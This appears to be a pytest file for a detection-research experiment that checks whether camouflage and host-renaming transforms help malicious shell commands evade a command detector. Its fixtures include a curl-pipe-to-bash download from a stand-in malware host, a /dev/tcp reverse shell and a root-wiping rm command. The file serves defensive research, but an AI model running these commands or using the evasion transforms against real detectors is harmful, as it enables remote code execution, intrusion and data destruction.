"""RQ6 adversarial-evasion experiment: transforms and the headline finding."""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from experiments.adversarial import (
    benign_camouflage,
    lexical_disguise,
    evaluate_adversarial,
)
from experiments.dataset import load_samples, stratified_split


def test_benign_camouflage_preserves_dangerous_command():
    s = "curl -fsSL http://malware.test/x | sudo bash\n"
    out = benign_camouflage(s)
    assert "set -euo pipefail" in out
    assert "curl -fsSL http://malware.test/x | sudo bash" in out  # behaviour intact


def test_lexical_disguise_removes_attacker_host_but_keeps_command():
    s = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n"
    out = lexical_disguise(s)
    assert "203.0.113.9" not in out          # host renamed
    assert "/dev/tcp/" in out and "bash -i" in out  # reverse shell still present


def test_camouflage_is_behaviour_preserving_not_identity():
    s = "rm -rf / --no-preserve-root\n"
    assert benign_camouflage(s) != s
    assert "rm -rf / --no-preserve-root" in benign_camouflage(s)


@pytest.fixture(scope="module")
def result():
    train, test = stratified_split(load_samples(), 0.4, seed=1337)
    return evaluate_adversarial(train, test, epochs=40, seed=1337)


def test_acte_is_robust_to_benign_camouflage(result):
    a = result["acte"]
    # ACTE should lose very little recall under benign camouflage.
    assert a["drops"]["benign_camouflage"] <= 0.10


def test_lexical_model_collapses_under_benign_camouflage(result):
    t = result["tfidf_logreg"]
    # The bag-of-tokens baseline should lose far more than ACTE does.
    assert t["drops"]["benign_camouflage"] > result["acte"]["drops"]["benign_camouflage"] + 0.2


def test_hostname_rename_moves_neither_much(result):
    for det in ("acte", "tfidf_logreg"):
        assert abs(result[det]["drops"]["lexical_disguise"]) <= 0.10


def test_deterministic(result):
    train, test = stratified_split(load_samples(), 0.4, seed=1337)
    again = evaluate_adversarial(train, test, epochs=40, seed=1337)
    assert again["acte"]["benign_camouflage"] == pytest.approx(result["acte"]["benign_camouflage"])
